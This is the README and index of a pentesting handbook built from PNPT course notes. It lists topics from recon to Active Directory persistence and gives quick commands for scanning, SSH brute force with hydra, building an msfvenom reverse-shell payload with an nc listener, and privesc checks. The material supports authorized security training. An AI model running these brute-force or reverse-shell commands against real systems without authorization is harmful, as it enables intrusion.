# TCM PNPT PENTESTING HANDBOOK

Quick reference guide for pentesting engagements. Commands marked with `$` are for command line execution.

## Table of Contents

### 0-Foundation
- [**QUICK-START**](TCM-PNPT-Notes/better-notes/0-Foundation/QUICK-START.md) - 5 stages, workflow checklist, common ports
- [**NETWORKING**](TCM-PNPT-Notes/better-notes/0-Foundation/NETWORKING.md) - OSI model, TCP/UDP, IPv4/IPv6, subnetting
- [**TOOLS-RESOURCES**](TCM-PNPT-Notes/better-notes/0-Foundation/TOOLS-RESOURCES.md) - Tools by phase, useful links, common ports

### 1-Reconnaissance
- [**PASSIVE-RECON**](TCM-PNPT-Notes/better-notes/1-Reconnaissance/PASSIVE-RECON.md) - OSINT tools, company info, no active scanning
- [**EMAIL-CREDENTIALS**](TCM-PNPT-Notes/better-notes/1-Reconnaissance/EMAIL-CREDENTIALS.md) - Email discovery, breach databases, credential harvesting

### 2-Scanning
- [**SUBDOMAIN-TECH**](TCM-PNPT-Notes/better-notes/2-Scanning/SUBDOMAIN-TECH.md) - Subdomain discovery, tech stack identification
- [**NMAP**](TCM-PNPT-Notes/better-notes/2-Scanning/NMAP.md) - Port scanning, service enumeration
- [**VULN-SCANNING**](TCM-PNPT-Notes/better-notes/2-Scanning/VULN-SCANNING.md) - Nessus, SearchSploit, CVE research
- [**HTTP-ENUMERATION**](TCM-PNPT-Notes/better-notes/2-Scanning/HTTP-ENUMERATION.md) - Web servers, directories, Nikto, Burp Suite
- [**SMB-ENUMERATION**](TCM-PNPT-Notes/better-notes/2-Scanning/SMB-ENUMERATION.md) - Windows shares, SMB version checking
- [**SSH-ENUMERATION**](TCM-PNPT-Notes/better-notes/2-Scanning/SSH-ENUMERATION.md) - SSH versions, weak algorithms, brute force
- [**DNS-OTHER-SERVICES**](TCM-PNPT-Notes/better-notes/2-Scanning/DNS-OTHER-SERVICES.md) - DNS, NFS, Telnet, hash identification

### 3-Exploitation
- [**BRUTE-FORCE**](TCM-PNPT-Notes/better-notes/3-Exploitation/BRUTE-FORCE.md) - Hydra, credential stuffing, password spraying
- [**METASPLOIT**](TCM-PNPT-Notes/better-notes/3-Exploitation/METASPLOIT.md) - MSFConsole basics, exploit workflow
- [**REVERSE-SHELLS**](TCM-PNPT-Notes/better-notes/3-Exploitation/REVERSE-SHELLS.md) - Shell types, MSFVenom, one-liners
- [**WEB-EXPLOITATION**](TCM-PNPT-Notes/better-notes/3-Exploitation/WEB-EXPLOITATION.md) - PHP shells, SQLi, LFI/RFI, file uploads
- [**ACTIVE-DIRECTORY**](TCM-PNPT-Notes/better-notes/3-Exploitation/ACTIVE-DIRECTORY.md) - LLMNR poisoning, Kerberoasting, PTH

### 4-Privesc
- [**PRIVESC**](TCM-PNPT-Notes/better-notes/4-Privesc/PRIVESC.md) - Linux/Windows privesc, SUID, sudo, UAC bypass

### 5-PostExploitation
- [**POST-EXPLOITATION**](TCM-PNPT-Notes/better-notes/5-PostExploitation/POST-EXPLOITATION.md) - File transfer, data exfil, log cleanup
- [**FILE-CRACKING**](TCM-PNPT-Notes/better-notes/5-PostExploitation/FILE-CRACKING.md) - ZIP cracking, hash identification, John/Hashcat

### 6-Active Directory
- **Attacking Active Directory - Post-Compromise Enumeration**
  - [**USERS-GROUPS**](TCM-PNPT-Notes/better-notes/active%20directory/Attacking%20Active%20Directory%20-%20Post-Compromise%20Enumeration/USERS-GROUPS.md) - User and group enumeration
  - [**DOMAIN-STRUCTURE**](TCM-PNPT-Notes/better-notes/active%20directory/Attacking%20Active%20Directory%20-%20Post-Compromise%20Enumeration/DOMAIN-STRUCTURE.md) - Domain trusts, permissions, ACLs
  - [**SHARES-RESOURCES**](TCM-PNPT-Notes/better-notes/active%20directory/Attacking%20Active%20Directory%20-%20Post-Compromise%20Enumeration/SHARES-RESOURCES.md) - Shares discovery and analysis

- **Attacking Active Directory - Post-Compromise Attacks**
  - [**PRIVILEGE-ESCALATION**](TCM-PNPT-Notes/better-notes/active%20directory/Attacking%20Active%20Directory%20-%20Post-Compromise%20Attacks/PRIVILEGE-ESCALATION.md) - Kerberoasting, delegation abuse, escalation techniques
  - [**LATERAL-MOVEMENT**](TCM-PNPT-Notes/better-notes/active%20directory/Attacking%20Active%20Directory%20-%20Post-Compromise%20Attacks/LATERAL-MOVEMENT.md) - PTH, PTT, lateral movement techniques
  - [**PERSISTENCE**](TCM-PNPT-Notes/better-notes/active%20directory/Attacking%20Active%20Directory%20-%20Post-Compromise%20Attacks/PERSISTENCE.md) - Backdoors, scheduled tasks, GPO manipulation

### Reference
- [**BURP-SUITE**](TCM-PNPT-Notes/better-notes/Reference/BURP-SUITE.md) - Setup, intercepting, testing, scanning
- [**CHEATSHEET**](TCM-PNPT-Notes/better-notes/Reference/CHEATSHEET.md) - All commands in one place
- [**REPORTING-LEGAL**](TCM-PNPT-Notes/better-notes/Reference/REPORTING-LEGAL.md) - Documentation, scope, legal considerations

## Directory Structure

## Directory Structure

```
notes/
├── README.md
├── 0-Foundation/
│   ├── 01-QUICK-START.md
│   ├── 02-NETWORKING.md
│   └── 03-TOOLS-RESOURCES.md
├── 1-Reconnaissance/
│   ├── 01-PASSIVE-RECON.md
│   └── 02-EMAIL-CREDENTIALS.md
├── 2-Scanning/
│   ├── 01-SUBDOMAIN-TECH.md
│   ├── 02-NMAP.md
│   ├── 03-VULN-SCANNING.md
│   ├── 04-HTTP-ENUMERATION.md
│   ├── 05-SMB-ENUMERATION.md
│   ├── 06-SSH-ENUMERATION.md
│   └── 07-DNS-OTHER-SERVICES.md
├── 3-Exploitation/
│   ├── 01-BRUTE-FORCE.md
│   ├── 02-METASPLOIT.md
│   ├── 03-REVERSE-SHELLS.md
│   ├── 04-WEB-EXPLOITATION.md
│   └── 05-ACTIVE-DIRECTORY.md
├── 4-Privesc/
│   └── 01-PRIVESC.md
├── 5-PostExploitation/
│   ├── 01-POST-EXPLOITATION.md
│   └── 02-FILE-CRACKING.md
└── Reference/
    ├── 01-BURP-SUITE.md
    ├── 02-CHEATSHEET.md
    └── 03-REPORTING-LEGAL.md
```

---

**Discovery:**
```bash
$ arp-scan -l
$ netdiscover -r 192.168.1.0/24
$ nmap -T4 -p- 192.168.1.100
```

**Web:**
```bash
$ nikto -h http://192.168.1.100
$ ffuf -w wordlist.txt:FUZZ -u http://192.168.1.100/FUZZ
```

**Brute Force:**
```bash
$ hydra -l admin -P wordlist.txt ssh://192.168.1.100:22 -t 4 -V
```

**Shells:**
```bash
$ msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe
$ nc -nvlp 4444
```

**Privesc:**
```bash
$ sudo -l
$ ./linpeas.sh
```

---

## Common Vulnerabilities to Test For

- **SQL Injection** - User input in database queries
- **XSS** - Unescaped user input in web pages
- **CSRF** - State-changing requests without tokens
- **LFI/RFI** - File inclusion vulnerabilities
- **Weak Auth** - Default credentials, brute-forceable passwords
- **Misconfiguration** - Open shares, weak permissions, exposed backups
- **Outdated Software** - Known CVEs with public exploits
- **Privilege Escalation** - SUID binaries, sudo misconfig, DLL hijacking

---

## Workflow Checklist

- [ ] Gather scope & authorization documents
- [ ] Passive reconnaissance (emails, subdomains)
- [ ] Active scanning (Nmap, Nessus)
- [ ] Service enumeration (versions, tech stack)
- [ ] Vulnerability research (CVEs, exploits)
- [ ] Exploitation attempts
- [ ] Privilege escalation
- [ ] Post-exploitation (data extraction, persistence)
- [ ] Documentation & reporting
- [ ] Cleanup (remove backdoors, clear logs)

---

**Last Updated:** January 2026  
**Framework:** TCM PNPT  
**Purpose:** Portable reference for pentesting engagements

